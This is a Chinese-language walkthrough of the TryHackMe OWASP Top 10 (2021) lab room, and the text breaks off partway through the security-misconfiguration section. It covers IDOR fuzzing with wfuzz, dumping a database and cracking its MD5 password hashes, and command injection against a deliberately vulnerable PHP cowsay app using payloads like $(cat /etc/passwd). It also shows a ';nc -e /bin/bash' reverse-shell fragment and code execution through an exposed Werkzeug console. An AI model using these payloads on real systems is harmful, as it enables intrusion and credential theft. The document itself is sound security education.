---
description: 本文相关内容：了解并利用OWASP Top 10漏洞中的每一个，它们是十大最严重的Web安全风险。
cover: ../../.gitbook/assets/2857591-20230614182517669-642644077.png
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# OWASP Top 10(2021版)

TryHackMe实验房间链接：[https://tryhackme.com/room/owasptop102021](https://tryhackme.com/room/owasptop102021)



## 简介



本文将对每个 OWASP 主题进行分析，并会包含关于漏洞主要原理、漏洞如何产生以及如何利用漏洞的详细信息。

1. Broken Access Control：失效的访问控制
2. Cryptographic Failures：加密机制失败
3. Injection：注入
4. Insecure Design：不安全的设计
5. Security Misconfiguration：安全配置错误
6. Vulnerable and Outdated Components：易受攻击和过时的组件
7. Identification and Authentication Failures：身份识别和身份验证错误
8. Software and Data Integrity Failures：软件和数据完整性故障
9. Security Logging & Monitoring Failures：安全日志和监控故障
10. Server-Side Request Forgery (SSRF)：服务器端请求伪造 (SSRF)

在学习本文内容时，并不需要具备任何网络安全基础知识。

**本文使用的是OWASP TOP 10的2021年标准**。

![image-20221205235710045](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205235710045.png)

## \[TOP1]失效的访问控制

![image-20221205112914400](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205112914400.png)

目标网站的某些页面可能会受到保护，从而不允许普通访问者对相关页面进行访问，例如，只有网站的管理员(admin)用户才能被允许访问用于管理其他用户的网站页面；如果目标网站的普通访问者能够访问他们无权查看的受保护页面，那么就代表目标站点的访问控制正处于失效状态。

如果网站的普通访问者能够访问受保护的页面，那么可能会导致以下情况：

* 能够查看目标网站上其他用户的敏感信息。
* 能够访问目标网站中未经授权的功能。

如果未经身份验证的用户可以访问目标站点的任何一个页面，则说明目标网站存在访问控制缺陷；如果非管理员用户可以访问管理页面，也说明目标网站存在访问控制缺陷。

简而言之，失效的访问控制&#x5C06;_**允许攻击者绕过授权**_（即：发生越权操作），这可以让他们像特权用户(此处不单指admin用户，而是指相对于普通用户权限更高的用户)一样查看敏感数据或者执行其他未授权操作。

例如，在[2019年发现了一个漏洞](https://bugs.xdavidhu.me/google/2021/01/11/stealing-your-private-videos-one-frame-at-a-time/)，攻击者可以从被标记为私有的YouTube视频中获取任何单个帧；发现该漏洞的研究人员表明，他可以利用此漏洞请求私有视频的几个帧并能在一定程度上重建视频。由于用户将某个YouTube视频标记为私有时的心理期望是没有人可以随意访问它，因此这的确可以被认为是一个失效的访问控制漏洞。

## 失效的访问控制(IDOR挑战)

**不安全的直接对象引用(IDOR-Insecure Direct Object Reference)**

IDOR或不安全的直接对象引用是指存在访问控制漏洞，我们可以通过该漏洞访问我们通常看不到的资源；当开发人员公开了直接对象引用时，就可能会发生这种情况，这里的引用是指引用服务器内特定对象的标识符，而具体的对象可以是文件、用户、银行应用程序中的银行帐户或者其他任何真实存在的互联网资源。

例如，假设我们正在登录银行帐户，当正确验证了自己的身份之后，我们可能会看到这样的URL`https://bank.thm/account?id=111111`；在此页面上，我们可以看到自己银行帐户的所有重要详细信息，作为用户我们将会在该页面继续做一些我们想做的事情，并认为没有任何问题。

![image-20240106005505612](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106005505612.png)

然而，在上述页面中可能存在一个潜在的巨大问题，那就是我们可以尝试将`id`参数的值修改为`222222`或者其他值，然后再进行访问，如果网站的配置不正确，那么我们就可以成功访问到其他人的银行帐户信息。

![image-20240106005516360](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106005516360.png)

在刚才的例子中，相关Web应用程序通过URL中的`id`参数公开了直接对象引用，而该参数指向的是特定帐户，如果该Web应用程序不会检查已登录的用户是否有权访问被`id`参数所引用的帐户，那么攻击者就可以通过IDOR漏洞获取其他用户的敏感信息。

注意：直接对象引用并不是导致IDOR漏洞的原因，相关Web应用程序没有验证已登录的用户是否有权访问特定参数所请求的帐户才是导致IDOR漏洞的关键。

### 答题

阅读本小节内容，并回答以下问题。

部署目标机器，使用攻击机的浏览器访问`http://MACHINE_IP` ，并且使用用户名`noot`和密码`test1234`进行登录操作。

![image-20240106171911868](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106171911868.png)

![image-20240106172004286](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106172004286.png)

修改URL参数以尝试查看其他用户的notes：

tips：我们也可以使用FUZZ工具（如wfuzz）来进行测试--`?note_id=FUZZ`范围设置为0到100即可。

`wfuzz -c --hh 0 -z range,0-100 http://10.10.194.227/note.php?note_id=FUZZ`

发现只有0和1对应的响应码为200。

![image-20240106172129192](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106172129192.png)

> 我们找到的flag内容为：flag{fivefourthree} 。

![image-20240106172829202](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106172829202.png)

## \[TOP2]加密机制失效

Web应用程序通常需要使用加密技术来为其用户提供多方面的机密性，而加密机制失效是指因误用(或缺乏使用)保护敏感信息的加密算法而产生的漏洞。

以一个安全的电子邮件应用程序为例：

* 当我们使用浏览器访问电子邮件帐户时，我们需要确保浏览器端与服务器端之间的通信经过了加密处理；这样，任何试图捕获我们的网络数据包的窃听者都将无法恢复关于我们的电子邮件地址的内容，当我们加密客户端和服务器之间的网络流量时，我们通常将此过程称为对传输中的数据进行加密。
* 由于我们的电子邮件被存储在邮件提供商所管理的某些服务器中，因此我们也希望电子邮件提供商无法读取其客户的电子邮件；为此，我们的电子邮件也可能会被加密存储在相关服务器上，这被称为静态数据加密。

加密机制失效通常会导致Web应用程序意外泄露敏感数据，这些数据一般是与客户直接相关的数据(例如姓名、出生日期、财务信息)，但也可能会是一些技术上的信息，例如用于实现登录的用户名和密码。

在更复杂的层面上，利用加密机制失效漏洞时通常还会涉及诸如“中间人攻击”之类的技术，攻击者可以通过这种技术强制用户连接到由攻击者所控制的网络设备，然后，攻击者会利用任何被传输数据的弱加密性来获取已截获的信息(即使数据一开始就被加密，攻击者也能通过这种方法来尝试获取敏感数据)。

tips：事实上，某些敏感数据可以直接在目标Web服务器本身上被找到。

## 加密机制失效(材料一)

以可从多个位置轻松访问的格式存储大量数据的最常见方法是使用数据库，这对于Web应用程序来说是很好的办法，因为可能会有许多用户在任意时间与目标网站发生交互。数据库引擎通常遵循结构化查询语言 (SQL-**S**tructured **Q**uery **L**anguage) 语法，当然，一些替代方案（例如 NoSQL）也越来越受欢迎。

在生产环境中，通常会看到在运行数据库服务(如MySQL或MariaDB等数据库服务)的专用服务器上设置数据库；但是，数据库也可以被存储为文件，这些文件形式的数据库被称为“平面文件(flat-file)”数据库，它们是作为单个文件被存储在计算机上的。 使用“平面文件(flat-file)”比设置完整的数据库服务器要容易得多，因此这种方法可能会在较小的Web应用程序中看到。

如前所述，平面文件数据库是作为文件存储在计算机磁盘上的，这对于Web应用程序来说不是问题，但如果将平面文件数据库存储在网站的根目录下(即变成连接到网站的用户所能够访问的文件之一)，会发生什么情况呢？ 这将导致我们可以直接下载网站的数据库文件到我们的本地机器上，并且可以完全访问对应的数据库文件中的所有内容，从而将导致敏感数据泄露。

让我们简要介绍一些用于查询平面文件数据库的语法。

平面文件数据库最常见(也是最简单)的格式是SQLite数据库，我们可以在大多数编程语言环境下与该格式的数据库进行交互，并且还可以使用一个专门的客户端通过命令行查询SQLite数据库的信息，这个专门的客户端叫做`sqlite3`，它在许多Linux发行版系统中会进行默认安装。

假设我们已经成功地下载了一个数据库文件：

![image-20240106220956338](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106220956338.png)

```shell
user@linux$ ls -l 
-rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db
                                                                                                                                                              
user@linux$ file example.db 
example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1
```

我们可以看到当前文件夹中有一个SQLite数据库，为了访问该数据库，我们可以使用`sqlite3 <database-name>`命令语法：

![image-20240106222748471](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106222748471.png)

```shell
user@linux$ sqlite3 example.db                     
SQLite version 3.39.2 2022-07-21 15:24:47
Enter ".help" for usage hints.
sqlite> 
```

然后我们可以继续使用`.tables`命令来查看数据库中的表：

![image-20240106222900375](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106222900375.png)

```shell
user@linux$ sqlite3 example.db                     
SQLite version 3.39.2 2022-07-21 15:24:47
Enter ".help" for usage hints.
sqlite> .tables
customers
```

现在我们可以转储表中的所有数据，但是在不查看表信息的前提下，我们并不一定知道表中每列的含义；我们可以先使用`PRAGMA table_info(customers);`查看表信息，然后再使用`SELECT * FROM customers;`来从表中转储信息。

![image-20240106230359645](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240106230359645.png)

```
sqlite> PRAGMA table_info(customers);
0|cudtID|INT|1||1
1|custName|TEXT|1||0
2|creditCard|TEXT|0||0
3|password|TEXT|1||0

sqlite> SELECT * FROM customers;
0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a
2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19
3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70
4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679
5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f
```

从上述的表信息中我们可以看到此表共有四列：`custID`、`custName`、`creditCard`、`password`；我们最终转储的结果和表中的列是匹配的，例如转储结果的第一行：

`0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99`

根据第一行转储结果，我们可以获取到以下信息：

> custID (0)、custName (Joy Paulson)、creditCard (4916 9012 2231 7905)、password的哈希值 (5f4dcc3b5aa765d61d8327deb882cf99)

tips：在下一小节中，我们将研究如何破解从数据库的表中转储得到的密码哈希值。

## 加密机制失效(材料二)

在上一个小节中，我们了解了如何查询 SQLite 数据库中的敏感数据，并且找到了一些密码哈希值(每个用户都有一个)。 在本小节中，我们将简要介绍如何破解这些密码哈希值。

在哈希破解方面，Kali 预装了各种工具——如果你知道如何使用这些工具，请随意使用即可。

在本小节中我们将使用以下在线工具进行hash破解工作：[Crackstation](https://crackstation.net/)。

Crackstation网站非常擅长破解弱密码的哈希值，而对于更复杂的哈希，我们则需要使用其他工具来进行破解； 本小节例子中的所有可破解的密码哈希值都是弱密码的 MD5 哈希值，所以我们直接使用Crackstation在线破解即可。

当我们导航到Crackstation网站时，我们会看到以下界面：

![image-20221203225245851](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203225245851.png)

粘贴我们在上一小节中找到的 Joy Paulson 的密码哈希值(`5f4dcc3b5aa765d61d8327deb882cf99`) ，勾选验证码，然后点击“破解哈希”按钮即可：

![image-20221203225511295](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221203225511295.png)

我们看到哈希值被成功破解，目标用户的密码是“password”！

注：Crackstation网站在破解hash时，将使用很大的字典进行工作，如果哈希值所对应的密码不在该网站所使用的字典中，那么Crackstation将无法破解该哈希值。

## 加密机制失效(操作实践)

现在是时候将我们所学到的知识付诸实践了，对于本小节的实验，我们需要测试URL`http://MACHINE_IP:81/`所对应的Web应用程序。

### 答题

部署目标机器，使用攻击机的浏览器访问`http://MACHINE_IP:81/`( 10.10.206.41:81)，然后查看login页面的源代码，我们看到作者留下了一些评论，告诉我们`/assets`网站目录下有一个数据库文件：

![image-20240109213001357](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213001357.png)

![image-20240109213051724](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213051724.png)

![image-20240109213136459](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213136459.png)

我们继续通过浏览器的url地址栏导航到目标站点的`/assets`页面，就能找到相关的数据库文件`webapp.db`(点击该文件即可将其下载到攻击机上)：

![image-20240109213242810](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213242810.png)

![image-20240109213443018](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213443018.png)

通过浏览器下载好数据库文件之后，我们就可以在攻击机终端上使用命令`ls`和`file webapp.db`(验证所下载的文件是否为数据库文件)：

![image-20240109213604353](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213604353.png)

继续在攻击机终端输入命令`sqlitebrowser webapp.db`以便使用可视化客户端来打开数据库文件，然后我们就能直观地查看该数据库的用户表中的敏感信息：

![image-20240109213707957](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213707957.png)

![image-20240109213817221](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213817221.png)

> 在用户表中，admin用户所对应的密码hash值为：6eea9b7ef19179a06954edd0f6c05ceb

接下来，我们可以使用以下网站进行在线hash破解操作：

* https://crackstation.net/
* https://hashes.com/en/decrypt/hash

![image-20240109213926619](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109213926619.png)

> 经过hash破解得到admin的密码为：qwertyuiop

最后，使用刚才经过hash破解所得到的明文密码信息以admin用户身份登录目标站点，一旦登录成功即可看到flag内容：

![image-20240109214014730](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109214014730.png)

![image-20240109214041459](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109214041459.png)

> 我们得到的flag为：THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl} 。

![image-20240109214228085](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109214228085.png)

## \[TOP3]注入

注入漏洞在当今的Web应用中非常常见，出现这些漏洞是因为Web应用程序将用户所控制的输入数据解释为实际的命令或参数；注入攻击取决于当前Web应用程序正在使用的技术以及这些技术会如何解释用户所输入的数据，一些常见的例子包括：

* SQL注入：当用户控制的输入数据能够被传递为后端的SQL查询时，就会发生SQL注入；通过利用该漏洞，攻击者可以传入SQL查询语句来操纵针对目标数据库的查询行为(访问、修改、删除数据库中的信息)并获取到相关的查询结果(例如个人详细信息、用户登录凭据等)。
* 命令注入：当用户的输入能够被传递为系统命令时，就会发生命令注入；通过利用该漏洞，攻击者能够在Web应用程序的服务器上执行任意系统命令，从而允许他们访问用户的计算机系统。

如果攻击者能够成功地传递一些会被Web应用程序所解释的输入数据，他们将能够实现以下攻击目的：

* 构造恶意的SQL查询语句并执行SQL注入攻击，从而访问、修改和删除数据库中的数据信息；这将允许攻击者窃取数据库中的个人详细信息、用户登录凭据等敏感信息。
* 构造恶意的系统命令并执行命令注入攻击，从而在目标服务器上执行任意系统命令；这将允许攻击者访问"服务器用户所对应的权限级别下"的系统文件，然后攻击者就能够窃取存储在系统中的敏感数据，并能对与"执行恶意命令的受害服务器"相连接的其他网络基础设施发起更多攻击尝试。

针对注入攻击的主要防御措施是确保用户所控制的输入数据不会被解释为数据库查询语句或者有效的系统命令，有几种不同的方法可以做到这一点：

* 使用允许列表(白名单)：当用户提供的输入被发送到服务器时，此输入将会与安全输入或安全字符列表进行比较；如果用户所提供的输入数据被标记为安全的，那么它将被允许通过并由服务器进行正常处理，否则，用户所提供的输入数据将被拒绝通过，并且应用程序会抛出错误提示。
* 过滤用户所输入的数据：如果用户所提供的输入中包含某些危险字符，那么Web应用程序会先将这些危险字符清除，然后再继续让服务器进行处理。

危险字符或危险输入可以被归类为任何可能改变基础数据处理方式的外部输入，除了手动构造允许列表以及过滤用户输入数据之外，还存在各种函数库可以帮助我们执行注入防御操作。

## 命令注入

**概念介绍**

当Web应用程序中的服务器端代码(例如PHP)调用那些可直接与服务器控制台交互的函数时，就可能会发生命令注入；这是一个Web漏洞，该漏洞将允许攻击者利用其所构造的系统调用在服务器上任意执行操作系统命令。

命令注入漏洞能够为攻击者提供很多选择，比如简单地执行`whoami`命令或者简单地执行文件读取命令，攻击者所能做的更具危害性的事情就是利用命令注入漏洞来生成一个反向shell，并以此获得目标Web服务器运行时所对应的用户权限。

攻击者通过简单地执行`;nc -e /bin/bash`payload就可能获得目标Web服务器所具备的权限(注意：一些netcat命令的变体也可能不支持-e选项)，关于这方面，我们可以参考以下反向shell列表以及反向shell在线生成器：

> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
>
> https://www.revshells.com/

一旦攻击者在Web服务器上获得立足点(初始访问权限)，他们就可以开始对目标操作系统进行常规的枚举操作，并能够尝试寻找可用于提权或者内网横向移动的方法。

**代码示例**

让我们考虑以下场景：MooCorp团队想要开发一个基于Web的应用程序，用于呈现可定制文本的cow ASCII艺术字体，在寻找可用于实现该应用程序效果的方法时，他们想到了Linux中的`cowsay`命令，因此，他们决定编写一些简单的代码，从操作系统的控制台调用`cowsay`命令并将相关内容发送回网站页面。

让我们看看MooCorp团队在开发Web应用程序时所使用的涉及`cowsay`命令的部分代码：

```php
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```

简而言之，上述代码片段将执行以下操作：

1. 检查是否设置了参数"mooing"，如果设置了，就可以用变量`$mooing`获取传递到输入字段中的内容；
2. 检查是否设置了参数"cow" ，如果设置了，就可以用变量`$cow`获取通过参数传递的内容；
3. 然后程序将执行函数`passthru("perl /usr/bin/cowsay -f $cow $mooing");`，passthru函数会在操作系统的控制台中执行命令并将输出结果发送回用户的浏览器；在代码中，我们可以看到，我们的完整命令是通过在给定的部分命令的末尾连接上`$cow`变量和`$mooing`变量而形成的。

tips：如果你对`passthru()`函数感兴趣，可以参考PHP官网所提供的[相关文档](https://www.php.net/manual/en/function.passthru.php)以了解有关该函数的更多信息。

![image-20240107204849107](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240107204849107.png)

**利用命令注入漏洞**

现在我们知道了示例应用程序如何在幕后工作，接下来我们将利用被称为"inline commands-内联命令"的Bash特性来滥用owsay示例服务器并执行我们想要的任何任意命令。

Bash允许我们在命令中运行命令("inline commands-内联命令")，这在很多时候都很有用，而在我们的示例中，该特性将被用于在cowsay示例服务器中注入命令并使其执行。

要执行Bash内联命令，我们需要使用特定的格式——`$(your_command_here)`；如果控制台检测到了内联命令的存在，就会先执行内联命令，然后再将相关的执行结果作为外部命令的参数。如下图所示，我们可以将`whoami`命令作为`echo`命令的内联命令执行：

![image-20240107210010449](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240107210010449.png)

回到我们在上文中所提及的cowsay示例服务器，如果我们向该Web应用程序发送内联命令，那么就会发生以下情况：

![image-20240107210251435](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240107210251435.png)

tips: perl /usr/bin/cowsay -f $cow $(mooing)

由于示例应用程序会接受我们所提供的任何输入，因此我们就可以尝试注入一个内联命令，该内联命令会被执行并且将继续用作owsay命令的参数；最终，我们将能够注入任意内联命令并可得到命令的执行结果。

我们可以尝试执行以下Linux命令：

* `whoami`
* `id`
* `ifconfig/ip addr`
* `uname -a`
* `ps -ef`
* `ls`
* `ls -la`
* `cat /etc/passwd`
* `cat /etc/os-release`

### 答题

部署目标虚拟机，并使用攻击机的浏览器导航到`http://MACHINE_IP:82/`(10.10.206.41:82)页面以尝试利用cowsay示例服务器。

![image-20240109214427259](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109214427259.png)

在Cowsay Online输入框中输入$(ls)以查看网站根目录下的文件：

![image-20240109222305121](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109222305121.png)

> 可疑的文本文件为：drpepper.txt

在Cowsay Online输入框中输入$(cat /etc/passwd)以列出用户：

tip：按ctrl+f键可检索当前页面。

![image-20240109220341909](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109220341909.png)

> 发现没有非 root/非服务/非守护程序用户（标准用户）。
>
> 此处的提示为sbin，它是系统二进制文件的缩写，sbin是为系统管理员设计的，标准用户不应该访问它；所以看到/sbin/nologin则说明不是标准用户。

在Cowsay Online输入框中输入$(whoami)以查看当前应用程序以什么用户身份运行：

![image-20240109220638316](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109220638316.png)

继续使用$(cat /etc/passwd)列出用户并查看当前用户的shell设置：

tip：按ctrl+f键可检索当前页面。

![image-20240109221008958](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109221008958.png)

> 当前应用程序以什么用户身份运行：apache
>
> 当前用户的shell设置为：/sbin/nologin

在Cowsay Online输入框中输入$(cat /etc/os-release)以查看操作系统版本：

tips：也可以使用$(cat /etc/alpine-release)

![image-20240109221257109](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109221257109.png)

![image-20240109221533079](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109221533079.png)

> 运行当前应用程序的操作系统的版本为：3.16.0

![image-20240109221558880](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109221558880.png)

## \[TOP4]不安全的设计

**概念介绍**

"不安全的设计"是指应用程序架构本身所固有的漏洞，它们不是关于错误实现或错误配置的漏洞，而是整个应用程序(或其中一部分)背后的设计思想从一开始就存在缺陷。在大多数情况下，这类漏洞是因为在应用程序的规划阶段进行了不适当的威胁建模而出现的，并会一直影响到最终发布的应用程序。有时候，开发人员还会围绕代码添加一些“快捷功能”以使得他们测试起来更加容易，而这也可能会引入"不安全的设计"漏洞。例如，开发人员可能会在程序开发阶段选择禁用OTP验证，以便快速测试应用程序的其余部分，而无需在每次登录时手动输入代码，但如果开发人员在将该应用程序发布到生产环境时忘记重新启用OTP验证，那么就会导致出现"不安全的设计"漏洞。

**不安全的密码重置机制**

Instagram曾经出现过此类[不安全设计漏洞](https://thezerohack.com/hack-any-instagram)，它允许向用户的手机发送带有6位验证代码的短信，以便重置用户所忘记的密码；如果攻击者想要借助此机制访问受害者的帐户，那么攻击者就可能需要尝试暴力破解短信中的6位验证码，而这通常不可能直接实现(因为Instagram实施了速率限制措施，在250次验证尝试后，用户就会被阻止)。

![image-20240108185718735](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108185718735.png)

然而，我们发现Instagram所做的速率限制措施仅适用于来自同一个IP地址的验证尝试，如果攻击者使用多个不同的IP地址来发送请求进行，那么就可以突破250次验证尝试。对于6位验证码，有一百万种可能的组合，因此攻击者就需要使用1000000/250 = 4000 个 IP才能覆盖所有可能的验证码；这听起来攻击者似乎需要拥有大量的IP，但如果使用云服务则可以轻松地以相对较小的成本获取很多IP来使用，从而使得相关的攻击方式变得更加具有可行性。

![image-20240108190808099](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108190808099.png)

注意：出现上述漏洞的原因在于——应用程序设计者认为没有用户能够使用数千个 IP 地址发出并发请求来尝试暴力破解数字验证码。

由于"不安全的设计"漏洞是在应用程序开发过程的早期阶段被引入的，因此解决此类漏洞通常需要开发者从头开始重建应用程序的易受攻击部分，而这通常比解决任何其他简单的代码相关漏洞更难做到。避免出现此类漏洞的最佳方法是在开发生命周期的早期阶段执行威胁建模措施。

### 答题

部署目标虚拟机，使用攻击机的浏览器导航到`http://MACHINE_IP:85`(10.10.206.41:85)页面，我们已知该应用程序的密码重置机制存在设计缺陷 ，接下来我们将找出具体的“不安全的设计”并尝试利用该漏洞(针对`joseph`用户帐户进行密码重置)。

![image-20240109222416090](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109222416090.png)

![image-20240109222458473](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109222458473.png)

![image-20240109222552902](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109222552902.png)

通过对第二个密码保护问题进行猜测(Red, Orange, Yellow, Green, Blue, Indigo, 和Violet)，我们发现`green`是正确的密码保护答案，从而成功地重置了密码：

![image-20240109222801040](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109222801040.png)

![image-20240109222907400](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109222907400.png)

> lzwoWbRaAjLKUB

我们使用重置得到的密码登录`joseph`用户帐户，然后查看flag内容即可：

![image-20240109223038838](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109223038838.png)

![image-20240109223140492](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109223140492.png)

![image-20240109223151130](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109223151130.png)

> flag的内容为：THM{Not\_3ven\_c4tz\_c0uld\_sav3\_U!} 。

![image-20240109223246705](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109223246705.png)

## \[TOP5]安全配置错误

**概念介绍**

安全配置错误与其他Top 10漏洞不同，因为它们发生在本可以适当配置但却没有进行很好地配置的情况下，即使我们已经下载了最新的软件，但是不良的配置也可能使得我们已安装的程序容易受到攻击。

安全配置错误包括：

* 云服务的权限配置不当，例如S3存储桶；
* 启用了不必要的功能，例如某些服务、页面、帐户或权限；
* 使用了未更改默认密码的默认帐户；
* 报错信息过于详细，从而使得攻击者找到了关于系统的更多信息；
* 没有使用 [HTTP 安全标头](https://owasp.org/www-project-secure-headers/)。

此漏洞通常还会导致更多的漏洞出现，例如允许攻击者通过使用默认凭据来访问敏感数据、导致在admin页面上发生XML外部实体(XXE)注入或命令注入。

关于安全配置错误的详细信息，请参考以下链接页面：https://owasp.org/Top10/A05\_2021-Security\_Misconfiguration/

**调试接口泄露**

软件产品中的调试功能的暴露是一个常见的安全配置错误。在编程框架中通常会提供调试功能，以便开发人员访问一些高级功能，这对于在开发过程中调试应用程序很有用。如果开发人员在发布应用程序之前忘记禁用其中一些调试功能，那么攻击者就可以尝试滥用应用程序中的部分调试功能。

据称，在[2015年Patreon遭到网络攻击](https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/)时，黑客就利用了此类漏洞。在Patreon遭到网络攻击的五天前，一名安全人员向Patreon报告说——他发现了Werkzeug控制台的开放调试接口。Werkzeug是基于Python的Web应用程序中的重要组件，它能为Web服务器提供执行Python代码的接口；Werkzeug包含了一个调试控制台，在调试接口泄露的情况下，用户可以直接通过URL中的`/console`路径来访问该控制台，或者当应用程序引发异常时，该控制台也会呈现给用户。

![image-20240108194303246](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108194303246.png)

### 答题

部署目标虚拟机，使用攻击机的浏览器导航到`http://MACHINE_IP:86`(10.10.206.41:86)并尝试利用安全配置错误来读取应用程序的源代码。

我们可以使用浏览器访问`http://MACHINE_IP:86/console`页面以验证Werkzeug控制台是否泄露。

![image-20240109223536803](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109223536803.png)

使用Werkzeug控制台运行以下Python代码，从而尝试在目标服务器上执行`ls -l`命令：

```python
import os; print(os.popen("ls -l").read())

#这段代码使用Python的`os`模块执行了一个命令，具体而言，运行的是`ls -l`命令，然后打印该命令的输出结果。
#`os.popen()`函数被用于执行命令，`read()`方法被用于读取命令的输出结果。

#具体解释如下：

#1. `import os;` 导入Python的`os`模块。
